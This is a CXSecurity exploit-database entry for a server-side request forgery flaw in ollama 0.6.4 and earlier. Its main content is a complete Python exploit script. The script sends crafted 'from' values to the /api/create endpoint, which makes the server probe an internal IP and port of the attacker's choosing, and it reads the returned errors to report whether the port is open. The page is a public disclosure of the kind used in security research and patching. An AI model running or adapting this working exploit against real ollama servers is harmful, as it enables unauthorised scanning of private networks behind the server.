---
title: ollama 0.6.4 Server Side Request Forgery (SSRF)
url: https://cxsecurity.com/issue/WLB-2025040009
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-04-07
fetch_date: 2025-10-06T22:03:39.914927
---

# ollama 0.6.4 Server Side Request Forgery (SSRF)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ollama 0.6.4 Server Side Request Forgery (SSRF)** **2025.04.06**  Credit:  **[sud0](https://cxsecurity.com/author/sud0/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: ollama 0.6.4 - SSRF
# Date: 2025-04-03
# Exploit Author: sud0
# Vendor Homepage: https://ollama.com/
# Software Link: https://github.com/ollama/ollama/releases
# Version: <=0.6.4
# Tested on: CentOS 8
import argparse
import requests
import json
from urllib.parse import urljoin
def check\_port(api\_base, ip, port):
api\_endpoint = api\_base.rstrip('/') + '/api/create'
model\_path = "mynp/model:1.1"
target\_url = f"https://{ip}:{port}/{model\_path}"
payload = {
"model": "mario",
"from": target\_url,
"system": "You are Mario from Super Mario Bros."
}
try:
response = requests.post(api\_endpoint, json=payload, timeout=10, stream=True)
response.raise\_for\_status()
for line in response.iter\_lines():
if line:
try:
json\_data = json.loads(line.decode('utf-8'))
if "error" in json\_data and "pull model manifest" in json\_data["error"]:
error\_msg = json\_data["error"]
model\_path\_list = model\_path.split(":", 2)
model\_path\_prefix = model\_path\_list[0]
model\_path\_suffix = model\_path\_list[1]
model\_path\_with\_manifests = f"{model\_path\_prefix}/manifests/{model\_path\_suffix}"
if model\_path\_with\_manifests in error\_msg:
path\_start = error\_msg.find(model\_path\_with\_manifests)
result = error\_msg[path\_start+len(model\_path\_with\_manifests)+3:] if path\_start != -1 else ""
print(f"Raw Response: {result}")
if "connection refused" in error\_msg.lower():
print(f"[!] Port Closed - {ip}:{port}")
else:
print(f"[+] Port Maybe Open - {ip}:{port}")
return
except json.JSONDecodeError:
continue
print(f"[?] Unkown Status - {ip}:{port}")
except requests.exceptions.RequestException as e:
print(f"[x] Execute failed: {str(e)}")
if \_\_name\_\_ == "\_\_main\_\_":
parser = argparse.ArgumentParser(description="ollama ssrf - port scan")
parser.add\_argument("--api", required=True, help="Ollama api url")
parser.add\_argument("-i", "--ip", required=True, help="target ip")
parser.add\_argument("-p", "--port", required=True, type=int, help="target port")
args = parser.parse\_args()
check\_port(args.api, args.ip, args.port)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025040009)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top